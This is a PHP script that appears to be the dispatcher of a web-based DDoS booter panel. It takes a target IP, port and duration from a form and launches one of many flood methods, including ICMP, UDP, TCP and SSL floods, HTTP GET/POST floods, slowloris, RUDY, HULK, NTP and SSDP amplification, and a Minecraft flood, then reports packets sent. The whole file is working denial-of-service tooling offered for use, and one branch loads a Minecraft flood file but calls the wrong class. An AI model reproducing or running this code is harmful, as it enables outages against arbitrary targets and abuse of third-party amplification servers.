<?php
	include_once "header.php";
	//Number of socket
	if(!empty($_POST['builds'])){
		$socketn = $_POST['builds'];
	}else{$socketn = 100;}
	//Message length
	if(!empty($_POST['lenght'])){
		$lenght = $_POST['lenght'];
	}else{$lenght = 1024;}
	//timeout
	if(!empty($_POST['timedout'])){
		$timedout = $_POST['timedout'];
	}else{$timedout = 30;}
	//Host
	if(!empty($_POST['ip'])){
		$ip = $_POST['ip'];
	}else{
		echo "host is empty!";
		//break;
	}
	//Source IP
	if(!empty($_POST['srcip'])){
		$srcip = $_POST['srcip'];
	}else{$srcip = "";}
	//Method
	if(!empty($_POST['method'])){
		$method = $_POST['method'];  
	}else{
		echo "method is empty!";
		//break;
	}
	//Port
	if(!empty($_POST['port'])){
		$port = $_POST['port']; 
	}else{$port = 80;}
	//Exec Time
	if(!empty($_POST['time'])){
		$exec_time = $_POST['time'];  
	}else{
		echo "exec_time is empty!";
		//break;
	}
	//Thread
	/*if(!empty($_POST['thread'])){
		$thread = $_POST['thread'];   
	}else{$thread = 60;}*/

	$packets = 0;
	$starttime = date("Y-m-d H:i:s");
	$max_time = time()+$exec_time;


	ignore_user_abort(FALSE); 
	ini_set('max_execution_time', $max_time);

	include_once "../class/attack.php";
	$attack = new attack($socketn, $lenght, $timedout, $ip, $srcip, $port, $max_time);
	
	switch ($method) {
    case "icmp":
        include_once "../class/flood/icmp.php";
    	$worker = new icmp($attack->getIp(), $attack->getMax_time());
    	$packets +=$worker->start();
        break;
    case "smurf":
        echo "Not work yet";
        break;
    case "udp":
        include_once "../class/flood/fourflood.php";
        $worker = new fourflood($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getMax_time(), "udp");
    	$packets +=$worker->start();
        break;
    case "tcp":
        include_once "../class/flood/fourflood.php";
        $worker = new fourflood($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getMax_time(), "tcp");
    	$packets +=$worker->start();
        break;
    case "syn":
		echo "Not work yet";
		break;
	case "get":
		include_once "../class/flood/sevenfloods.php";
		$worker = new sevenfloods($attack->getIp(), $attack->getMax_time(), "GET");
    	$packets +=$worker->start();
		break;
	case "post":
		include_once "../class/flood/sevenfloods.php";
		$worker = new sevenfloods($attack->getIp(), $attack->getMax_time(), "POST");
    	$packets +=$worker->start();
		break;
	case "404":
		include_once "../class/flood/sevenfloods.php";
		$worker = new sevenfloods($attack->getIp(), $attack->getMax_time(), "404");
    	$packets +=$worker->start();
		break;
	case "slowloris":
		include_once "../class/flood/slowloris.php";
    	$worker = new slowloris($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getSocketn(), $attack->getMax_time());
    	$packets +=$worker->start();
		break;
	case "arme":
		include_once "../class/flood/arme.php";
    	$worker = new arme($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getSocketn(), $attack->getMax_time());
    	$packets +=$worker->start();
		break;
	case "hulk":
		include_once "../class/flood/hulk.php";
    	$worker = new hulk($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getSocketn(), $attack->getMax_time());
    	$packets +=$worker->start();
		break;
	case "rudy":
		include_once "../class/flood/rudy.php";
    	$worker = new rudy($attack->getIp(), $attack->getPort(), $attack->getSocketn(), $attack->getMax_time());
    	$packets +=$worker->start();
		break;
	case "ntpattack":
		include_once "../class/flood/ntpattack.php";
		$worker = new ntpattack($attack->getIp(), $attack->getMax_time());
    	$packets +=$worker->start();
		break;
	case "ssdpattack":
		include_once "../class/flood/ssdpattack.php";
		$worker = new ssdpattack($attack->getIp(), $attack->getPort(), $attack->getMax_time());
    	$packets +=$worker->start();
		break;
	case "toxicssl":
		include_once "../class/flood/toxicssl.php";
    	$worker = new toxicssl($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getSocketn(), $attack->getMax_time());
    	$packets +=$worker->start();
		break;
	case "ssl":
		include_once "../class/flood/fourflood.php";
        $worker = new fourflood($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getMax_time(), "ssl");
    	$packets +=$worker->start();
        break;
	case "minecraftbandwitdh":
		include_once "../class/flood/minecraftflood.php";
    	$worker = new rudy($attack->getIp(), $attack->getPort(), $attack->getMax_time());
    	$packets +=$worker->start();
		break;
	case "hoic": 
		echo "Not work yet";
		break;
	case "":
		echo "404 - Method Not Found";
		break;
	}
	echo "Packet send: ".$packets. "<br>".
		"Packet/s: ".$packets/$exec_time."";
	




?>
